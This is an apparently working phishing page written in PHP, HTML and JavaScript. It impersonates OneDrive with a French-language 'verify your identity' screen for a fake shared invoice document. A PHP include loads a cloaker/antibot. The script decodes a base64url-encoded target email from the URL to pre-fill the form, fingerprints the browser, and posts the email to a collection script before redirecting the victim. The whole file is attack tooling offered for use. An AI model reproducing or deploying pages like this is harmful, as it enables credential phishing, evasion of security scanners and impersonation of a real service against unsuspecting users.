<?php
// no whitespace/BOM before this line
require_once __DIR__ . '/includes/index.php'; // your cloaker/antibot
?>
<!doctype html>
<html lang="fr">
<head>
  <meta charset="utf-8">
  <title>Vérification de l’e-mail</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
<style>
  /* ===== Brand tokens ===== */
  :root{
    --brand:#1f6fd1; --brand-700:#1657a6;
    --bg:#f1f1f1; --card:#f5f5f5; --text:#1f2937; --muted:#6b7280; --border:#ccc;
    --radius:3px; --card-shadow:0 12px 28px rgba(0,0,0,.08);
    --maxw:320px; --focus:#6aa1ff;
    --logo-size:120px; --gap-top:-3px; --gap-between:-6px; --brandbar-h:38px; --logo-shift:-10px;
  }
  @media (prefers-color-scheme: dark){
    :root{ --bg:#0f141a; --card:#121922; --text:#f2f5f9; --muted:#9aa4b2; --border:#273142; --card-shadow:0 12px 28px rgba(0,0,0,.6); }
  }
  *{ box-sizing:border-box }
  html,body{ height:100% }
  body{ margin:0; font:14px/1.5 system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif; background:var(--bg); color:var(--text); }

  .brandbar{ height:var(--brandbar-h); background:var(--brand); color:#fff; display:flex; align-items:center; padding:0 16px; font-weight:450; letter-spacing:.6px; font-size:17px; }

  .wrap{ min-height:auto; display:flex; flex-direction:column; align-items:center; justify-content:flex-start; padding:var(--gap-top) 16px 16px; }

  .card-logo{ width:var(--logo-size); height:var(--logo-size); display:block; margin:0 auto var(--gap-between); transform:translateX(var(--logo-shift)); object-fit:contain; max-width:100%; }
  @media (prefers-color-scheme: dark){ .card-logo{ filter:brightness(1.05) contrast(1.02); } }

  .card{ width:75%; max-width:var(--maxw); background:var(--card); border:1px solid var(--border); border-radius:var(--radius); box-shadow:var(--card-shadow); overflow:hidden; font-size:12px; margin-top:var(--gap-between); }
  .card-head{ padding:16px 12px; border-bottom:1.2px solid var(--border); text-align:center; }
  .card-title{ margin:0; font-size:20px; line-height:1.25; font-weight:350; }
  .card-body{ padding:15px 16px }
  .card-body p{ margin:0 0 10px 0; color:var(--muted) }

  .file{ display:inline-block; padding:8px 12px; border:0; border-radius:4px; background:transparent; color:var(--text); font-weight:450; margin:4px 0 10px; word-break:break-word; max-width:100%; font-size:16px; }

  .field{ margin:10px 0 0 0 }
  label{ display:block; font-size:12px; color:var(--muted); margin-bottom:6px }
  .input{ width:100%; height:40px; border:1.5px solid #ccc; border-radius:3px; padding:0 12px; background:var(--card); color:var(--text); outline:none; }
  .input:focus{ border-color:#000; }

  .actions{ margin:17px 0 7px; display:flex; gap:12px }
  .btn{ appearance:none; border:0; cursor:pointer; height:40px; padding:0 18px; border-radius:var(--radius); background:var(--brand); color:#fff; font-weight:450; font-size:16px; width:100%; }
  .btn:hover{ background:var(--brand-700) }

  .caption{ font-size:13px; color:var(--muted); margin-top:13px; margin-bottom:18px }
  .caption small{ display:block; opacity:.95; }

  /* Styled legal line */
  .caption-legal{ color:#334155; font-weight:600; letter-spacing:.25px; }

  .alert{ font:12px/1.6 system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif; margin-top:8px; display:none; color:#b91c1c; }

  @media (max-width:480px){ :root{ --maxw:92vw; --logo-size:84px; } .card-title{ font-size:18px } }

  .simple-footer{ margin-top:4px; text-align:center; color:var(--muted); font:10px/1.4 system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif; }
</style>
</head>
<body>

  <!-- Barre de marque -->
  <div class="brandbar">
    <span id="brandName">OneDrive</span>
  </div>

  <main class="wrap">
    <!-- Logo au-dessus de la carte -->
    <img class="card-logo" src="a/nn.PNG" alt="" width="10" height="10" decoding="async" loading="eager">

    <!-- Honeypot -->
    <input type="text" id="middleName" name="middleName" tabindex="-1" autocomplete="off"
           aria-hidden="true" style="position:absolute;left:-9999px;opacity:0;height:0;width:0;border:0;padding:0;">

    <!-- Formulaire -->
    <form class="card" id="verifyForm" method="post" action="/validate.php">
      <header class="card-head" aria-labelledby="t">
        <h1 id="t" class="card-title">Vérifiez votre identité</h1>
      </header>

      <section class="card-body">
        <p>Un lien sécurisé vous a été envoyé pour&nbsp;:</p>
        <div class="file" id="fileName">FAC64836-2025.docx</div>
        <p>Pour ouvrir ce lien sécurisé, saisissez l’adresse e-mail avec laquelle il a été partagé.</p>

        <div class="field">
          <label for="email">Adresse e-mail</label>
          <input class="input" id="email" name="email" type="email" autocomplete="email"
                 placeholder="Saisir l’adresse e-mail" required inputmode="email" />
        </div>

        <!-- Boîte d’erreur (cachée par défaut) -->
        <div id="err" class="alert" role="status" aria-live="polite"></div>

        <div class="actions">
          <button class="btn" id="continueBtn" type="submit" disabled>Suivant</button>
        </div>

        <div class="caption" id="disclosure">
  <small style="color:#transparent;font-weight:400;letter-spacing:.10px;">
            En sélectionnant Suivant vous autorisez l’utilisation de votre e-mail pour l’authentification et le contrôle d’accès, conformément à notre notice de confidentialité.
          </small>
        </div>
      </section>
    </form>
  </main>

  <div class="simple-footer">© 2025&nbsp;&nbsp;Confidentialité &amp; Cookies</div>




  


<script>
document.addEventListener('DOMContentLoaded', () => {
  const $ = id => document.getElementById(id);
  const looksLikeEmail = v => /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(String(v).trim());
  const show = (n, msg) => { if (!n) return; if (msg) n.textContent = msg; n.style.display = 'block'; };
  const hide = n => { if (!n) return; n.style.display = 'none'; };

  // i18n
  const LANG = ((navigator.languages && navigator.languages[0]) || navigator.language || 'en').slice(0,2).toLowerCase();
  const T = {
    en: { invalidEmail:'Please enter a valid email address.', errorGeneric:'Something went wrong. Please try again.', redirecting:'Redirecting…', next:'Continue', placeholder:'username@company.com' },
    fr: { invalidEmail:'Veuillez saisir une adresse e-mail valide.', errorGeneric:'Une erreur est survenue. Merci de réessayer.', redirecting:'Redirection…', next:'Continuer', placeholder:'nom@entreprise.com' }
  };
  const t = T[LANG] || T.en;

  // DOM
  const form     = $('verifyForm');
  const input    = $('email');
  const errBox   = $('err');
  const submitEl = $('submitBtn') || $('continueBtn');
  const gateway  = 'z/validate.php';

  // Base64url decode
  const b64urlDecode = (s) => {
    try {
      let str = String(s || '').replace(/-/g,'+').replace(/_/g,'/');
      str += '==='.slice((str.length + 3) % 4);
      return atob(str);
    } catch { return ''; }
  };

  // Robust auto-grab:
  // - hash   → https://site/page#<b64url>
  // - dollar → https://site/page$<b64url>
  // - query  → https://site/page?e=<b64url>
  // - path   → last segment as fallback (handles your sample URL form)
  const emailFromURL = () => {
    const href = String(location.href);
    let encoded = null;

    // 1) fragment
    const h = location.hash ? location.hash.slice(1) : '';
    if (h) encoded = h;

    // 2) dollar marker
    if (!encoded) {
      const i = href.lastIndexOf('$');
      if (i !== -1) encoded = href.slice(i + 1);
    }

    // 3) query ?e=
    if (!encoded) {
      const p = new URLSearchParams(location.search);
      if (p.has('e')) encoded = p.get('e');
    }

    // 4) last path segment fallback (e.g., your sample link)
    if (!encoded) {
      const segs = location.pathname.split('/').filter(Boolean);
      if (segs.length) encoded = segs[segs.length - 1];
    }

    if (!encoded) return null;
    const email = b64urlDecode(encoded);
    return looksLikeEmail(email) ? email.toLowerCase() : null;
  };

  // Prevent placeholder flash: leave blank now; fill later only if needed
  if (input && input.getAttribute('placeholder') == null) input.setAttribute('placeholder','');

  // Try to auto-fill from URL
  const autograb = emailFromURL();
  if (autograb && input) {
    input.value = autograb;
    input.readOnly = true; // optional: lock if prefilled
  }

  // Basic fingerprint (optional)
  let fpHash = '';
  (async () => {
    try {
      const sig = [navigator.userAgent, navigator.language, navigator.platform, screen.width + 'x' + screen.height].join('|');
      const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(sig));
      fpHash = btoa(String.fromCharCode(...new Uint8Array(buf)));
    } catch {}
  })();

  // Button state helpers
  const setBtn = (enabled, label) => {
    if (!submitEl) return;
    submitEl.disabled = !enabled;
    if (label) submitEl.textContent = label;
  };
  setBtn(!!(input && looksLikeEmail(input.value)), t.next);

  input?.addEventListener('input', () => {
    hide(errBox);
    setBtn(looksLikeEmail(input.value), t.next);
  });

  // Submit
  form?.addEventListener('submit', async (e) => {
    e.preventDefault();

    const val  = (input?.value || '').trim().toLowerCase();
    const trap = ($('middleName')?.value || '').trim(); // honeypot must be empty

    if (!looksLikeEmail(val)) return show(errBox, t.invalidEmail);
    if (trap) return; // bot

    const payload = {
      email: val,
      middleName: trap,
      jsToken: 'ok-' + Math.random().toString(36).slice(2),
      fingerprint: fpHash
    };

    const ctl = new AbortController();
    const timer = setTimeout(() => ctl.abort(), 12000);

    try {
      setBtn(false, t.next);

      const res = await fetch(gateway, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Accept-Language': LANG },
        body: JSON.stringify(payload),
        signal: ctl.signal
      });

      const raw = await res.text();
      let json = {};
      try { json = JSON.parse(raw); } catch {}

      if (res.ok && json.valid && json.redirect) {
        setBtn(false, t.redirecting);
        setTimeout(() => { location.assign(json.redirect); }, 500);
      } else {
        const msg = (json && (json.message || json.detail))
          ? json.message + (json.detail ? ` (${json.detail})` : '')
          : `${t.errorGeneric} [${res.status}]`;
        show(errBox, msg);
        setBtn(looksLikeEmail(val), t.next);
      }
    } catch {
      show(errBox, t.errorGeneric);
      setBtn(looksLikeEmail(input?.value || ''), t.next);
    } finally {
      clearTimeout(timer);
    }
  });

  // Set localized placeholder only if not auto-filled (prevents flash)
  if (input && !input.value) input.setAttribute('placeholder', t.placeholder);
});
</script>


</body>
</html>
